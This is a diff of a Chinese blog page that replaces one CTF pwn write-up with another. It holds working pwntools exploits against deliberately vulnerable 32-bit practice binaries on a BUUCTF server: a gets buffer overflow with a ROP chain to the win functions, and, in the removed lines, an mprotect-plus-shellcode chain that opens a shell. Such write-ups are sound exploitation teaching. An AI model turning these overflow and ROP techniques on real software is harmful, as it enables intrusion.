@@ -17,21 +17,23 @@
   <meta http-equiv="window-target" content="_top" />
   
   
-  <title>buuctf-not_the_same_3dsctf_2016 | solo</title>
-  <meta name="description" content="not_the_same_3dsctf_2016看保护 12345Arch:     i386-32-littleRELRO:    Partial RELRO				&#x2F;&#x2F;没开Stack:    No canary found			&#x2F;&#x2F;没开NX:       NX enabledPIE:      No PIE (0x8048000)		&#x2F;&#x2F;没开  我们看向伪代码 12345678int __cd">
+  <title>buuctf-PicoCTF_2018_rop_chain | solo</title>
+  <meta name="description" content="PicoCTF_2018_rop_chain12345Arch:     i386-32-littleRELRO:    Partial RELROStack:    No canary found			&#x2F;&#x2F;没开NX:       NX enabledPIE:      No PIE (0x8048000)		&#x2F;&#x2F;没开  在main函数里面的vuln() 1234567char *vuln()&amp;#">
 <meta property="og:type" content="article">
-<meta property="og:title" content="buuctf-not_the_same_3dsctf_2016">
-<meta property="og:url" content="http://example.com/2022/01/16/buuctf-not-the-same-3dsctf-2016/index.html">
+<meta property="og:title" content="buuctf-PicoCTF_2018_rop_chain">
+<meta property="og:url" content="http://example.com/2022/03/18/buuctf-PicoCTF-2018-rop-chain/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="not_the_same_3dsctf_2016看保护 12345Arch:     i386-32-littleRELRO:    Partial RELRO				&#x2F;&#x2F;没开Stack:    No canary found			&#x2F;&#x2F;没开NX:       NX enabledPIE:      No PIE (0x8048000)		&#x2F;&#x2F;没开  我们看向伪代码 12345678int __cd">
+<meta property="og:description" content="PicoCTF_2018_rop_chain12345Arch:     i386-32-littleRELRO:    Partial RELROStack:    No canary found			&#x2F;&#x2F;没开NX:       NX enabledPIE:      No PIE (0x8048000)		&#x2F;&#x2F;没开  在main函数里面的vuln() 1234567char *vuln()&amp;#">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2022-01-16T13:01:06.000Z">
-<meta property="article:modified_time" content="2022-01-16T13:01:47.369Z">
+<meta property="og:image" content="http://example.com/2022/03/18/buuctf-PicoCTF-2018-rop-chain/image-20220318083607039.png">
+<meta property="article:published_time" content="2022-03-18T01:23:14.000Z">
+<meta property="article:modified_time" content="2022-03-18T01:24:18.364Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="buuctf-pwn">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/03/18/buuctf-PicoCTF-2018-rop-chain/image-20220318083607039.png">
   <!-- Canonical links -->
-  <link rel="canonical" href="http://example.com/2022/01/16/buuctf-not-the-same-3dsctf-2016/index.html">
+  <link rel="canonical" href="http://example.com/2022/03/18/buuctf-PicoCTF-2018-rop-chain/index.html">
   
     <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -341,14 +343,14 @@
   
 <main class="main" role="main">
   <div class="content">
-  <article id="post-buuctf-not-the-same-3dsctf-2016" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
+  <article id="post-buuctf-PicoCTF-2018-rop-chain" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
     
     <div class="article-header">
       
         
   
     <h1 class="article-title" itemprop="name">
-      buuctf-not_the_same_3dsctf_2016
+      buuctf-PicoCTF_2018_rop_chain
     </h1>
   
 
@@ -356,8 +358,8 @@
       <div class="article-meta">
         <span class="article-date">
     <i class="icon icon-calendar-check"></i>
-	<a href="/2022/01/16/buuctf-not-the-same-3dsctf-2016/" class="article-date">
-	  <time datetime="2022-01-16T13:01:06.000Z" itemprop="datePublished">2022-01-16</time>
+	<a href="/2022/03/18/buuctf-PicoCTF-2018-rop-chain/" class="article-date">
+	  <time datetime="2022-03-18T01:23:14.000Z" itemprop="datePublished">2022-03-18</time>
 	</a>
 </span>
         
@@ -370,38 +372,44 @@
 
         
 
-        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2022/01/16/buuctf-not-the-same-3dsctf-2016/#comments" class="article-comment-link">评论</a></span>
+        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2022/03/18/buuctf-PicoCTF-2018-rop-chain/#comments" class="article-comment-link">评论</a></span>
         
       </div>
     </div>
     <div class="article-entry marked-body" itemprop="articleBody">
       
-        <h2 id="not-the-same-3dsctf-2016"><a href="#not-the-same-3dsctf-2016" class="headerlink" title="not_the_same_3dsctf_2016"></a>not_the_same_3dsctf_2016</h2><p>看保护</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO				//没开</span><br><span class="line">Stack:    No canary found			//没开</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)		//没开</span><br></pre></td></tr></table></figure>
+        <h1 id="PicoCTF-2018-rop-chain"><a href="#PicoCTF-2018-rop-chain" class="headerlink" title="PicoCTF_2018_rop_chain"></a>PicoCTF_2018_rop_chain</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found			//没开</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)		//没开</span><br></pre></td></tr></table></figure>
 
-<p>我们看向伪代码</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [esp+Fh] [ebp-2Dh]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;b0r4 v3r s3 7u 4h o b1ch4o m3m0... &quot;</span>);</span><br><span class="line">  gets(&amp;v4);		<span class="comment">//漏洞函数</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在main函数里面的vuln()</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+0h] [ebp-18h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter your input&gt; &quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> gets(&amp;s);			<span class="comment">//溢出</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>我们找/bin/sh等字符串发现没有其中的字符串,但是搜索flag，有一个flag.txt,找到一个函数为get_secret()函数</p>
-<p>get_secret()函数如下</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_secret</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// esi</span></span><br><span class="line"></span><br><span class="line">  v0 = fopen(<span class="string">&quot;flag.txt&quot;</span>, &amp;unk_80CF91B);</span><br><span class="line">  fgets(&amp;fl4g, <span class="number">45</span>, v0);</span><br><span class="line">  <span class="keyword">return</span> fclose(v0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在字符串中找到了flag.txt</p>
+<p><img src="/2022/03/18/buuctf-PicoCTF-2018-rop-chain/image-20220318083607039.png" alt="image-20220318083607039"></p>
+<p>我们看向flag.txt所在函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">flag</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+Ch] [ebp-3Ch]</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+3Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(</span><br><span class="line">      <span class="string">&quot;Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(&amp;s, <span class="number">48</span>, stream);</span><br><span class="line">  <span class="keyword">if</span> ( win1 &amp;&amp; win2 &amp;&amp; a1 == <span class="number">-559039827</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, &amp;s);</span><br><span class="line">  <span class="keyword">if</span> ( win1 &amp;&amp; win2 )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Incorrect Argument. Remember, you can call other functions in between each win function!&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( win1 || win2 )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Nice Try! You&#x27;re Getting There!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;You won&#x27;t get the flag that easy..&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p> fgets函数是读取一句字符串,读取到fl4g中fl4g的bss段</p>
-<p>这个时候可以正常rop用write读出来</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">sl=<span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line"><span class="comment">#io=process(&#x27;./not_the_same_3dsctf_2016&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26903</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./not_the_same_3dsctf_2016&#x27;</span>)</span><br><span class="line"></span><br><span class="line">bss=<span class="number">0x080eca2d</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x2d</span>+p32(<span class="number">0x80489a0</span>)+p32(elf.sym[<span class="string">&#x27;write&#x27;</span>])+p32(bss)+p32(<span class="number">1</span>)+p32(bss)+p32(<span class="number">42</span>)</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<p>我感觉主要的是</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( win1 &amp;&amp; win2 &amp;&amp; a1 == <span class="number">-559039827</span> )</span><br></pre></td></tr></table></figure>
+
+<p>&amp;&amp;逻辑表达式,两个表达式为真才为真</p>
+<p>然后a1==-559039827==0xDEADBAAD</p>
+<p>我们要找或者给他传参这个win1与win2,在ida中也是有这个两个传参</p>
+<p>win_function1()</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">win_function1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  win1 = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 
 
-<p>之后看他们的博客有第2种办法这个办法,是我没有涉及到的思路,我们看向wp吧,来解析</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26903</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;not_the_same_3dsctf_2016&#x27;</span>)</span><br><span class="line">read_addr=elf.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">mprotect=<span class="number">0x806ED40</span></span><br><span class="line">addr=<span class="number">0x80eb000</span></span><br><span class="line">p3_ret=<span class="number">0x806fcc8</span></span><br><span class="line"></span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">payload  =<span class="string">&#x27;a&#x27;</span>*<span class="number">0x2d</span>+p32(mprotect)+p32(p3_ret)</span><br><span class="line">payload +=p32(addr)+p32(<span class="number">0x100</span>)+p32(<span class="number">0x7</span>)</span><br><span class="line"></span><br><span class="line">payload +=p32(read_addr)+p32(p3_ret)</span><br><span class="line"></span><br><span class="line">payload +=p32(<span class="number">0</span>)+p32(addr)+p32(<span class="built_in">len</span>(shellcode))+p32(addr)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<p>win_function2()</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">win_function2</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  result = (<span class="keyword">unsigned</span> __int8)win1;</span><br><span class="line">  <span class="keyword">if</span> ( win1 &amp;&amp; a1 == <span class="number">-1163220307</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    win2 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( win1 )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">&quot;Wrong Argument. Try Again.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">&quot;Nope. Try a little bit harder.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>他这里是用mprotect函数，可以用它来修改我们内存栈的权限，让它可读可写可执行，接着让写入shellcode，然后执行获取shell</p>
-<p>首先<code>0x2d</code>是main函数中栈空间的大小，它的下一个位置就是ret指令对应的返回地址了</p>
-<p>p32(mprotect)就是mprotect函数的地址，接下来的p32(pop)是为了保持栈平衡而将后面压入的三个参数从栈上弹出，弹出后我们并不使用它，就是为了控制栈的结构，p32(pop)的位置也同样是执行完mprotect后的返回地址，pop对应的指令为 pop esi ; pop ebx ; pop edx ; ret，最后ret就跳转到p32(read_addr)这里了</p>
-<p>同理，<code>p32(read_addr)</code>的下一个<code>p32(addr)</code>也是执行完read函数后跳转的地址，后面是read的三个参数</p>
-<p>整个思路就是，利用<code>mprotect</code>函数修改bss段为<code>0x7</code>即<code>0b111</code>，可读可写可执行权限，然后利用read函数读入shellcode，最后跳转到shellcode的位置，就成功拿到shell了</p>
-<p>小结:</p>
-<p>好像也是可以用printf输出flag</p>
+<p>win_function2()这个函数里面要传参win1与a1==0xBAAAAAAD来达到条件然后把值win2==1.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+<span class="string">&#x27;b&#x27;</span>*<span class="number">4</span>+p32(win_function1)+p32(win_function2)+p32(flag)+p32(<span class="number">0xBAAAAAAD</span>)+p32(<span class="number">0xDEADBAAD</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>差不多就是这样</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27236</span>)</span><br><span class="line"><span class="comment">#p=process(&#x27;./PicoCTF_2018_rop_chain&#x27;)</span></span><br><span class="line">win_function1=<span class="number">0x080485CB</span></span><br><span class="line">win_function2=<span class="number">0x080485D8</span></span><br><span class="line">flag=<span class="number">0x0804862B</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+<span class="string">&#x27;b&#x27;</span>*<span class="number">4</span>+p32(win_function1)+p32(win_function2)+p32(flag)+p32(<span class="number">0xBAAAAAAD</span>)+p32(<span class="number">0xDEADBAAD</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
 
       
     </div>
@@ -411,7 +419,7 @@
     
     <li class="post-copyright-link hidden-xs">
       <strong>本文链接：</strong>
-      <a href="http://example.com/2022/01/16/buuctf-not-the-same-3dsctf-2016/" title="buuctf-not_the_same_3dsctf_2016" target="_blank" rel="external">http://example.com/2022/01/16/buuctf-not-the-same-3dsctf-2016/</a>
+      <a href="http://example.com/2022/03/18/buuctf-PicoCTF-2018-rop-chain/" title="buuctf-PicoCTF_2018_rop_chain" target="_blank" rel="external">http://example.com/2022/03/18/buuctf-PicoCTF-2018-rop-chain/</a>
     </li>
     
     <li class="post-copyright-license">
@@ -457,13 +465,9 @@
   
   <ul class="pager pull-left">
     
-    <li class="prev">
-      <a href="/2022/01/16/buuctf-HarekazeCTF2019-baby-rop/" title="buuctf-[HarekazeCTF2019]baby_rop"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;上一篇</span></a>
-    </li>
-    
     
     <li class="next">
-      <a href="/2022/01/16/buuctf-ciscn-2019-en-2/" title="buuctf-ciscn_2019_en_2"><span>下一篇&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
+      <a href="/2022/03/18/buuctf-ez-pz-hackover-2016/" title="buuctf-ez_pz_hackover_2016"><span>下一篇&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
     </li>
     
     
